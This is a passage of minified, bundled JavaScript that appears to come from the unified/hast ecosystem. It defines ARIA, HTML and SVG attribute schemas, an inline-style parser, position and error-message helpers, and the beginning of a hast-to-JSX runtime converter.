io=class{constructor(e,t){this.attribute=t,this.property=e}};io.prototype.attribute=``,io.prototype.booleanish=!1,io.prototype.boolean=!1,io.prototype.commaOrSpaceSeparated=!1,io.prototype.commaSeparated=!1,io.prototype.defined=!1,io.prototype.mustUseProperty=!1,io.prototype.number=!1,io.prototype.overloadedBoolean=!1,io.prototype.property=``,io.prototype.spaceSeparated=!1,io.prototype.space=void 0;var ao=s({boolean:()=>L,booleanish:()=>R,commaOrSpaceSeparated:()=>V,commaSeparated:()=>co,number:()=>z,overloadedBoolean:()=>so,spaceSeparated:()=>B}),oo=0,L=lo(),R=lo(),so=lo(),z=lo(),B=lo(),co=lo(),V=lo();function lo(){return 2**++oo}var uo=Object.keys(ao),H=class extends io{constructor(e,t,n,r){let i=-1;if(super(e,t),U(this,`space`,r),typeof n==`number`)for(;++i<uo.length;){let e=uo[i];U(this,uo[i],(n&ao[e])===ao[e])}}};H.prototype.defined=!0;function U(e,t,n){n&&(e[t]=n)}function fo(e){let t={},n={};for(let[r,i]of Object.entries(e.properties)){let a=new H(r,e.transform(e.attributes||{},r),i,e.space);e.mustUseProperty&&e.mustUseProperty.includes(r)&&(a.mustUseProperty=!0),t[r]=a,n[ro(r)]=r,n[ro(a.attribute)]=r}return new to(t,n,e.space)}var po=fo({properties:{ariaActiveDescendant:null,ariaAtomic:R,ariaAutoComplete:null,ariaBusy:R,ariaChecked:R,ariaColCount:z,ariaColIndex:z,ariaColSpan:z,ariaControls:B,ariaCurrent:null,ariaDescribedBy:B,ariaDetails:null,ariaDisabled:R,ariaDropEffect:B,ariaErrorMessage:null,ariaExpanded:R,ariaFlowTo:B,ariaGrabbed:R,ariaHasPopup:null,ariaHidden:R,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:B,ariaLevel:z,ariaLive:null,ariaModal:R,ariaMultiLine:R,ariaMultiSelectable:R,ariaOrientation:null,ariaOwns:B,ariaPlaceholder:null,ariaPosInSet:z,ariaPressed:R,ariaReadOnly:R,ariaRelevant:null,ariaRequired:R,ariaRoleDescription:B,ariaRowCount:z,ariaRowIndex:z,ariaRowSpan:z,ariaSelected:R,ariaSetSize:z,ariaSort:null,ariaValueMax:z,ariaValueMin:z,ariaValueNow:z,ariaValueText:null,role:null},transform(e,t){return t===`role`?t:`aria-`+t.slice(4).toLowerCase()}});function mo(e,t){return t in e?e[t]:t}function ho(e,t){return mo(e,t.toLowerCase())}var go=fo({attributes:{acceptcharset:`accept-charset`,classname:`class`,htmlfor:`for`,httpequiv:`http-equiv`},mustUseProperty:[`checked`,`multiple`,`muted`,`selected`],properties:{abbr:null,accept:co,acceptCharset:B,accessKey:B,action:null,allow:null,allowFullScreen:L,allowPaymentRequest:L,allowUserMedia:L,alpha:L,alt:null,as:null,async:L,autoCapitalize:null,autoComplete:B,autoFocus:L,autoPlay:L,blocking:B,capture:null,charSet:null,checked:L,cite:null,className:B,closedBy:null,colorSpace:null,cols:z,colSpan:z,command:null,commandFor:null,content:null,contentEditable:R,controls:L,controlsList:B,coords:z|co,crossOrigin:null,data:null,dateTime:null,decoding:null,default:L,defer:L,dir:null,dirName:null,disabled:L,download:so,draggable:R,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:L,formTarget:null,headers:B,height:z,hidden:so,high:z,href:null,hrefLang:null,htmlFor:B,httpEquiv:B,id:null,imageSizes:null,imageSrcSet:null,inert:L,inputMode:null,integrity:null,is:null,isMap:L,itemId:null,itemProp:B,itemRef:B,itemScope:L,itemType:B,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:L,low:z,manifest:null,max:null,maxLength:z,media:null,method:null,min:null,minLength:z,multiple:L,muted:L,name:null,nonce:null,noModule:L,noValidate:L,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:L,optimum:z,pattern:null,ping:B,placeholder:null,playsInline:L,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:L,referrerPolicy:null,rel:B,required:L,reversed:L,rows:z,rowSpan:z,sandbox:B,scope:null,scoped:L,seamless:L,selected:L,shadowRootClonable:L,shadowRootCustomElementRegistry:L,shadowRootDelegatesFocus:L,shadowRootMode:null,shadowRootSerializable:L,shape:null,size:z,sizes:null,slot:null,span:z,spellCheck:R,src:null,srcDoc:null,srcLang:null,srcSet:null,start:z,step:null,style:null,tabIndex:z,target:null,title:null,translate:null,type:null,typeMustMatch:L,useMap:null,value:R,width:z,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:B,axis:null,background:null,bgColor:null,border:z,borderColor:null,bottomMargin:z,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:L,declare:L,event:null,face:null,frame:null,frameBorder:null,hSpace:z,leftMargin:z,link:null,longDesc:null,lowSrc:null,marginHeight:z,marginWidth:z,noResize:L,noHref:L,noShade:L,noWrap:L,object:null,profile:null,prompt:null,rev:null,rightMargin:z,rules:null,scheme:null,scrolling:R,standby:null,summary:null,text:null,topMargin:z,valueType:null,version:null,vAlign:null,vLink:null,vSpace:z,allowTransparency:null,autoCorrect:null,autoSave:null,credentialless:L,disablePictureInPicture:L,disableRemotePlayback:L,exportParts:co,part:B,prefix:null,property:null,results:z,security:null,unselectable:null},space:`html`,transform:ho}),_o=fo({attributes:{accentHeight:`accent-height`,alignmentBaseline:`alignment-baseline`,arabicForm:`arabic-form`,baselineShift:`baseline-shift`,capHeight:`cap-height`,className:`class`,clipPath:`clip-path`,clipRule:`clip-rule`,colorInterpolation:`color-interpolation`,colorInterpolationFilters:`color-interpolation-filters`,colorProfile:`color-profile`,colorRendering:`color-rendering`,crossOrigin:`crossorigin`,dataType:`datatype`,dominantBaseline:`dominant-baseline`,enableBackground:`enable-background`,fillOpacity:`fill-opacity`,fillRule:`fill-rule`,floodColor:`flood-color`,floodOpacity:`flood-opacity`,fontFamily:`font-family`,fontSize:`font-size`,fontSizeAdjust:`font-size-adjust`,fontStretch:`font-stretch`,fontStyle:`font-style`,fontVariant:`font-variant`,fontWeight:`font-weight`,glyphName:`glyph-name`,glyphOrientationHorizontal:`glyph-orientation-horizontal`,glyphOrientationVertical:`glyph-orientation-vertical`,hrefLang:`hreflang`,horizAdvX:`horiz-adv-x`,horizOriginX:`horiz-origin-x`,horizOriginY:`horiz-origin-y`,imageRendering:`image-rendering`,letterSpacing:`letter-spacing`,lightingColor:`lighting-color`,markerEnd:`marker-end`,markerMid:`marker-mid`,markerStart:`marker-start`,maskType:`mask-type`,navDown:`nav-down`,navDownLeft:`nav-down-left`,navDownRight:`nav-down-right`,navLeft:`nav-left`,navNext:`nav-next`,navPrev:`nav-prev`,navRight:`nav-right`,navUp:`nav-up`,navUpLeft:`nav-up-left`,navUpRight:`nav-up-right`,onAbort:`onabort`,onActivate:`onactivate`,onAfterPrint:`onafterprint`,onBeforePrint:`onbeforeprint`,onBegin:`onbegin`,onCancel:`oncancel`,onCanPlay:`oncanplay`,onCanPlayThrough:`oncanplaythrough`,onChange:`onchange`,onClick:`onclick`,onClose:`onclose`,onCopy:`oncopy`,onCueChange:`oncuechange`,onCut:`oncut`,onDblClick:`ondblclick`,onDrag:`ondrag`,onDragEnd:`ondragend`,onDragEnter:`ondragenter`,onDragExit:`ondragexit`,onDragLeave:`ondragleave`,onDragOver:`ondragover`,onDragStart:`ondragstart`,onDrop:`ondrop`,onDurationChange:`ondurationchange`,onEmptied:`onemptied`,onEnd:`onend`,onEnded:`onended`,onError:`onerror`,onFocus:`onfocus`,onFocusIn:`onfocusin`,onFocusOut:`onfocusout`,onHashChange:`onhashchange`,onInput:`oninput`,onInvalid:`oninvalid`,onKeyDown:`onkeydown`,onKeyPress:`onkeypress`,onKeyUp:`onkeyup`,onLoad:`onload`,onLoadedData:`onloadeddata`,onLoadedMetadata:`onloadedmetadata`,onLoadStart:`onloadstart`,onMessage:`onmessage`,onMouseDown:`onmousedown`,onMouseEnter:`onmouseenter`,onMouseLeave:`onmouseleave`,onMouseMove:`onmousemove`,onMouseOut:`onmouseout`,onMouseOver:`onmouseover`,onMouseUp:`onmouseup`,onMouseWheel:`onmousewheel`,onOffline:`onoffline`,onOnline:`ononline`,onPageHide:`onpagehide`,onPageShow:`onpageshow`,onPaste:`onpaste`,onPause:`onpause`,onPlay:`onplay`,onPlaying:`onplaying`,onPopState:`onpopstate`,onProgress:`onprogress`,onRateChange:`onratechange`,onRepeat:`onrepeat`,onReset:`onreset`,onResize:`onresize`,onScroll:`onscroll`,onSeeked:`onseeked`,onSeeking:`onseeking`,onSelect:`onselect`,onShow:`onshow`,onStalled:`onstalled`,onStorage:`onstorage`,onSubmit:`onsubmit`,onSuspend:`onsuspend`,onTimeUpdate:`ontimeupdate`,onToggle:`ontoggle`,onUnload:`onunload`,onVolumeChange:`onvolumechange`,onWaiting:`onwaiting`,onZoom:`onzoom`,overlinePosition:`overline-position`,overlineThickness:`overline-thickness`,paintOrder:`paint-order`,panose1:`panose-1`,pointerEvents:`pointer-events`,referrerPolicy:`referrerpolicy`,renderingIntent:`rendering-intent`,shapeRendering:`shape-rendering`,stopColor:`stop-color`,stopOpacity:`stop-opacity`,strikethroughPosition:`strikethrough-position`,strikethroughThickness:`strikethrough-thickness`,strokeDashArray:`stroke-dasharray`,strokeDashOffset:`stroke-dashoffset`,strokeLineCap:`stroke-linecap`,strokeLineJoin:`stroke-linejoin`,strokeMiterLimit:`stroke-miterlimit`,strokeOpacity:`stroke-opacity`,strokeWidth:`stroke-width`,tabIndex:`tabindex`,textAnchor:`text-anchor`,textDecoration:`text-decoration`,textRendering:`text-rendering`,transformOrigin:`transform-origin`,typeOf:`typeof`,underlinePosition:`underline-position`,underlineThickness:`underline-thickness`,unicodeBidi:`unicode-bidi`,unicodeRange:`unicode-range`,unitsPerEm:`units-per-em`,vAlphabetic:`v-alphabetic`,vHanging:`v-hanging`,vIdeographic:`v-ideographic`,vMathematical:`v-mathematical`,vectorEffect:`vector-effect`,vertAdvY:`vert-adv-y`,vertOriginX:`vert-origin-x`,vertOriginY:`vert-origin-y`,wordSpacing:`word-spacing`,writingMode:`writing-mode`,xHeight:`x-height`,playbackOrder:`playbackorder`,timelineBegin:`timelinebegin`},properties:{about:V,accentHeight:z,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:z,amplitude:z,arabicForm:null,ascent:z,attributeName:null,attributeType:null,azimuth:z,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:z,by:null,calcMode:null,capHeight:z,className:B,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:z,diffuseConstant:z,direction:null,display:null,dur:null,divisor:z,dominantBaseline:null,download:L,dx:null,dy:null,edgeMode:null,editable:null,elevation:z,enableBackground:null,end:null,event:null,exponent:z,externalResourcesRequired:null,fill:null,fillOpacity:z,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:co,g2:co,glyphName:co,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:z,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:z,horizOriginX:z,horizOriginY:z,id:null,ideographic:z,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:z,k:z,k1:z,k2:z,k3:z,k4:z,kernelMatrix:V,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:z,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskType:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:z,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:z,overlineThickness:z,paintOrder:null,panose1:null,path:null,pathLength:z,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:B,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:z,pointsAtY:z,pointsAtZ:z,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:V,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:V,rev:V,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:V,requiredFeatures:V,requiredFonts:V,requiredFormats:V,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:z,specularExponent:z,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:z,strikethroughThickness:z,string:null,stroke:null,strokeDashArray:V,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:z,strokeOpacity:z,strokeWidth:null,style:null,surfaceScale:z,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:V,tabIndex:z,tableValues:null,target:null,targetX:z,targetY:z,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:V,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:z,underlineThickness:z,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:z,values:null,vAlphabetic:z,vMathematical:z,vectorEffect:null,vHanging:z,vIdeographic:z,version:null,vertAdvY:z,vertOriginX:z,vertOriginY:z,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:z,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:`svg`,transform:mo}),vo=fo({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:`xlink`,transform(e,t){return`xlink:`+t.slice(5).toLowerCase()}}),yo=fo({attributes:{xmlnsxlink:`xmlns:xlink`},properties:{xmlnsXLink:null,xmlns:null},space:`xmlns`,transform:ho}),bo=fo({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:`xml`,transform(e,t){return`xml:`+t.slice(3).toLowerCase()}}),xo={classId:`classID`,dataType:`datatype`,itemId:`itemID`,strokeDashArray:`strokeDasharray`,strokeDashOffset:`strokeDashoffset`,strokeLineCap:`strokeLinecap`,strokeLineJoin:`strokeLinejoin`,strokeMiterLimit:`strokeMiterlimit`,typeOf:`typeof`,xLinkActuate:`xlinkActuate`,xLinkArcRole:`xlinkArcrole`,xLinkHref:`xlinkHref`,xLinkRole:`xlinkRole`,xLinkShow:`xlinkShow`,xLinkTitle:`xlinkTitle`,xLinkType:`xlinkType`,xmlnsXLink:`xmlnsXlink`},So=/[A-Z]/g,Co=/-[a-z]/g,wo=/^data[-\w.:]+$/i;function To(e,t){let n=ro(t),r=t,i=io;if(n in e.normal)return e.property[e.normal[n]];if(n.length>4&&n.slice(0,4)===`data`&&wo.test(t)){if(t.charAt(4)===`-`){let e=t.slice(5).replace(Co,Do);r=`data`+e.charAt(0).toUpperCase()+e.slice(1)}else{let e=t.slice(4);if(!Co.test(e)){let n=e.replace(So,Eo);n.charAt(0)!==`-`&&(n=`-`+n),t=`data`+n}}i=H}return new i(r,t)}function Eo(e){return`-`+e.toLowerCase()}function Do(e){return e.charAt(1).toUpperCase()}var Oo=no([po,go,vo,yo,bo],`html`),ko=no([po,_o,vo,yo,bo],`svg`);function Ao(e){return e.join(` `).trim()}var jo=o(((e,t)=>{var n=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,r=/\n/g,i=/^\s*/,a=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,o=/^:\s*/,s=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,c=/^[;\s]*/,l=/^\s+|\s+$/g;function u(e,t){if(typeof e!=`string`)throw TypeError(`First argument must be a string`);if(!e)return[];t||={};var l=1,u=1;function f(e){var t=e.match(r);t&&(l+=t.length);var n=e.lastIndexOf(`
`);u=~n?e.length-n:u+e.length}function p(){var e={line:l,column:u};return function(t){return t.position=new m(e),_(),t}}function m(e){this.start=e,this.end={line:l,column:u},this.source=t.source}m.prototype.content=e;function h(n){var r=Error(t.source+`:`+l+`:`+u+`: `+n);if(r.reason=n,r.filename=t.source,r.line=l,r.column=u,r.source=e,!t.silent)throw r}function g(t){var n=t.exec(e);if(n){var r=n[0];return f(r),e=e.slice(r.length),n}}function _(){g(i)}function v(e){var t;for(e||=[];t=y();)t!==!1&&e.push(t);return e}function y(){var t=p();if(e.charAt(0)==`/`&&e.charAt(1)==`*`){for(var n=2;e.charAt(n)!=``&&(e.charAt(n)!=`*`||e.charAt(n+1)!=`/`);)++n;if(n+=2,e.charAt(n-1)===``)return h(`End of comment missing`);var r=e.slice(2,n-2);return u+=2,f(r),e=e.slice(n),u+=2,t({type:`comment`,comment:r})}}function b(){var e=p(),t=g(a);if(t){if(y(),!g(o))return h(`property missing ':'`);var r=g(s),i=e({type:`declaration`,property:d(t[0].replace(n,``)),value:r?d(r[0].replace(n,``)):``});return g(c),i}}function x(){var e=[];v(e);for(var t;t=b();)t!==!1&&(e.push(t),v(e));return e}return _(),x()}function d(e){return e?e.replace(l,``):``}t.exports=u})),Mo=o((e=>{var t=e&&e.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(e,"__esModule",{value:!0}),e.default=r;var n=t(jo());function r(e,t){let r=null;if(!e||typeof e!=`string`)return r;let i=(0,n.default)(e),a=typeof t==`function`;return i.forEach(e=>{if(e.type!==`declaration`)return;let{property:n,value:i}=e;a?t(n,i,e):i&&(r||={},r[n]=i)}),r}})),No=o((e=>{Object.defineProperty(e,"__esModule",{value:!0}),e.camelCase=void 0;var t=/^--[a-zA-Z0-9_-]+$/,n=/-([a-z])/g,r=/^[^-]+$/,i=/^-(webkit|moz|ms|o|khtml)-/,a=/^-(ms)-/,o=function(e){return!e||r.test(e)||t.test(e)},s=function(e,t){return t.toUpperCase()},c=function(e,t){return`${t}-`};e.camelCase=function(e,t){return t===void 0&&(t={}),o(e)?e:(e=e.toLowerCase(),e=t.reactCompat?e.replace(a,c):e.replace(i,c),e.replace(n,s))}})),Po=o(((e,t)=>{var n=(e&&e.__importDefault||function(e){return e&&e.__esModule?e:{default:e}})(Mo()),r=No();function i(e,t){var i={};return!e||typeof e!=`string`||(0,n.default)(e,function(e,n){e&&n&&(i[(0,r.camelCase)(e,t)]=n)}),i}i.default=i,t.exports=i})),Fo=Lo(`end`),Io=Lo(`start`);function Lo(e){return t;function t(t){let n=t&&t.position&&t.position[e]||{};if(typeof n.line==`number`&&n.line>0&&typeof n.column==`number`&&n.column>0)return{line:n.line,column:n.column,offset:typeof n.offset==`number`&&n.offset>-1?n.offset:void 0}}}function Ro(e){let t=Io(e),n=Fo(e);if(t&&n)return{start:t,end:n}}function zo(e){return!e||typeof e!=`object`?``:`position`in e||`type`in e?Vo(e.position):`start`in e||`end`in e?Vo(e):`line`in e||`column`in e?Bo(e):``}function Bo(e){return Ho(e&&e.line)+`:`+Ho(e&&e.column)}function Vo(e){return Bo(e&&e.start)+`-`+Bo(e&&e.end)}function Ho(e){return e&&typeof e==`number`?e:1}var Uo=class extends Error{constructor(e,t,n){super(),typeof t==`string`&&(n=t,t=void 0);let r=``,i={},a=!1;if(t&&(i=`line`in t&&`column`in t||`start`in t&&`end`in t?{place:t}:`type`in t?{ancestors:[t],place:t.position}:{...t}),typeof e==`string`?r=e:!i.cause&&e&&(a=!0,r=e.message,i.cause=e),!i.ruleId&&!i.source&&typeof n==`string`){let e=n.indexOf(`:`);e===-1?i.ruleId=n:(i.source=n.slice(0,e),i.ruleId=n.slice(e+1))}if(!i.place&&i.ancestors&&i.ancestors){let e=i.ancestors[i.ancestors.length-1];e&&(i.place=e.position)}let o=i.place&&`start`in i.place?i.place.start:i.place;this.ancestors=i.ancestors||void 0,this.cause=i.cause||void 0,this.column=o?o.column:void 0,this.fatal=void 0,this.file=``,this.message=r,this.line=o?o.line:void 0,this.name=zo(i.place)||`1:1`,this.place=i.place||void 0,this.reason=this.message,this.ruleId=i.ruleId||void 0,this.source=i.source||void 0,this.stack=a&&i.cause&&typeof i.cause.stack==`string`?i.cause.stack:``,this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}};Uo.prototype.file=``,Uo.prototype.name=``,Uo.prototype.reason=``,Uo.prototype.message=``,Uo.prototype.stack=``,Uo.prototype.column=void 0,Uo.prototype.line=void 0,Uo.prototype.ancestors=void 0,Uo.prototype.cause=void 0,Uo.prototype.fatal=void 0,Uo.prototype.place=void 0,Uo.prototype.ruleId=void 0,Uo.prototype.source=void 0;var Wo=l(Po(),1),Go={}.hasOwnProperty,Ko=new Map,qo=/[A-Z]/g,Jo=new Set([`table`,`tbody`,`thead`,`tfoot`,`tr`]),Yo=new Set([`td`,`th`]),Xo=`https://github.com/syntax-tree/hast-util-to-jsx-runtime`;function Zo(e,t){if(!t||t.Fragment===void 0)throw TypeError("Expected `Fragment` in options");let n=t.filePath||void 0,r;if(t.development){if(typeof t.jsxDEV!=`function`)throw TypeError("Expected `jsxDEV` in options when `development: true`");r=cs(n,t.jsxDEV)}else{if(typeof t.jsx!=`function`)throw TypeError("Expected `jsx` in production options");if(typeof t.jsxs!=`function`)throw TypeError("Expected `jsxs` in production options");r=ss(n,t.jsx,t.jsxs)}let i={Fragment:t.Fragment,ancestors:[],components:t.components||{},create:r,elementAttributeNameCase:t.elementAttributeNameCase||`react`,evaluater:t.createEvaluater?t.createEvaluater():void 0,filePath:n,ignoreInvalidStyle:t.ignoreInvalidStyle||!1,passKeys:t.passKeys!==!1,passNode:t.passNode||!1,schema:t.space===`svg`?ko:Oo,stylePropertyNameCase:t.stylePropertyNameCase||`dom`,tableCellAlignToStyle:t.tableCellAlignToStyle!==!1},a=Qo(i,e,void 0);return a&&typeof a!=`string`?a:i.create(e,i.Fragment,{children:a||void 0},void 0)}function Qo(e,t,n){if(t.type===`element`)return $o(e,t,n);if(t.type===`mdxFlowExpression`||t.type===`mdxTextExpression`)return es(e,t);if(t.type===`mdxJsxFlowElement`||t.type===`mdxJsxTextElement`)return ns(e,t,n);if(t.type===`mdxjsEsm`)return ts(e,t);if(t.type===`root`)return rs(e,t,n);if(t.type===`text`)return is(e,t)}function $o(e,t,n){let r=e.schema,i=r;t.tagName.toLowerCase()===`svg`&&r.space===`html`&&(i=ko,e.schema=i),e.ancestors.push(t);let a=ms(e,t.tagName,!1),o=ls(e,t),s=ds(e,t);return Jo.has(t.tagName)&&(s=s.filter(function(e){return typeof e!=`string`||!$a(e)})),as(e,o,a,t),os(o,s),e.ancestors.pop(),e.schema=r,e.create(t,a,o,n)}function es(e,t){if(t.data&&t.data.estree&&e.evaluater){let n=t.data.estree.body[0];return n.type,e.evaluater.evaluateExpression(n.expression)}hs(e,t.position)}function ts(e,t){if(t.data&&t.data.estree&&e.evaluater)return e.evaluater.evaluateProgram(t.data.estree);hs(e,t.position)}function ns(e,t,n){let r=e.schema,i=r;t.name===`svg`&&r.space===`html`&&(i=ko,e.schema=i),e.ancestors.push(t);let a=t.name===null?e.Fragment:ms(e,t.name,!0),o=us(e,t),s=ds(e,t);return as(e,o,a,t),os(o,s),e.ancestors.pop(),e.schema=r,e.create(t,a,o,n)}function rs(e,t,n){let r={};return os(r,ds(e,t)),e.create(t,e.Fragment,r,n)}function is(e,t){return t.value}function as(e,t,n,r){typeof n!=`string`&&n!==e.Fragment&&e.passNode&&(t.node=r)}function os(e,t){if(t.length>0){let n=t.length>1?t:t[0];n&&(e.children=n)}}function ss(e,t,n){return r;function r(e,r,i,a){let o=Array.isArray(i.children)?n:t;return a?o(r,i,a):o(r,i)}}function cs(e,t){return n;function n(n,r,i,a){let o=Array.isArray(i.children),s=Io(n);return t(r,i,a,o,{columnNumber:s?s.column-1:void 0,fileName:e,lineNumber:s?s.line:void 0},void 0)}}function ls(e,t){let n={},r,i;for(i in t.properties)if(i!==`children`&&Go.call(t.properties,i)){let a=fs(e,i,t.properties[i]);if(a){let[i,o]=a;e.tableCellAlignToStyle&&i===`align`&&typeof o==`string`&&Yo.has(t.tagName)?r=o:n[i]=o}}if(r){let t=n.style||={};t[e.stylePropertyNameCase===`css`?`text-align`:`textAlign`]=r}return n}function us(e,t){let n={};for(let r of t.attributes)if(r.type===`mdxJsxExpressionAttribute`){if(r.data&&r.data.estree&&e.evaluater){let t=r.data.estree.body[0];t.type;let i=t.expression;i.type;let a=i.properties[0];a.type,Object.assign(n,e.evaluater.evaluateExpression(a.argument))}else hs(e,t.position)}else{let i=r.name,a;if(r.value&&typeof r.value==`object`){if(r.value.data&&r.value.data.estree&&e.evaluater){let t=r.value.data.estree.body[0];t.type,a=e.evaluater.evaluateExpression(t.expression)}else hs(e,t.position)}else a=r.value===null||r.value;n[i]=a}return n}function ds(e,t){let n=[],r=-1,i=e.passKeys?new Map:Ko;for(;++r<t.children.length;){let a=t.children[r],o;if(e.passKeys){let e=a.type===`element`?a.tagName:a.type===`mdxJsxFlowElement`||a.type===`mdxJsxTextElement`?a.name:void 0;if(e){let t=i.get(e)||0;o=e+`-`+t,i.set(e,t+1)}}let s=Qo(e,a,o);s!==void 0&&n.push(s)}return n}function fs(e,t,n){let r=To(e.schema,t);if(!(n==null||typeof n==`number`&&Number.isNaN(n))){if(Array.isArray(n)&&(n=r.commaSeparated?qa(n):Ao(n)),r.property===`style`){let t=typeof n==`object`?n:ps(e,String(n));return e.stylePropertyNameCase===`css`&&(t=gs(t)),[`style`,t]}return[e.elementAttributeNameCase===`react`&&r.space?xo[r.property]||r.property:r.attribute,n]}}function ps(e,t){try{return(0,Wo.default)(t,{reactCompat:!0})}catch(t){if(e.ignoreInvalidStyle)return{};let n=t,r=new Uo("Cannot parse `style` attribute",{ancestors:e.ancestors,cause:n,ruleId:`style`,source:`hast-util-to-jsx-runtime`});throw r.file=e.filePath||void 0,r.url=Xo+`#cannot-parse-style-attribute`,r}}function ms(e,t,n){let r;if(!n)r={type:`Literal`,value:t};else if(t.includes(`.`)){let e=t.split(`.`),n=-1,i;for(;++n<e.length;){let 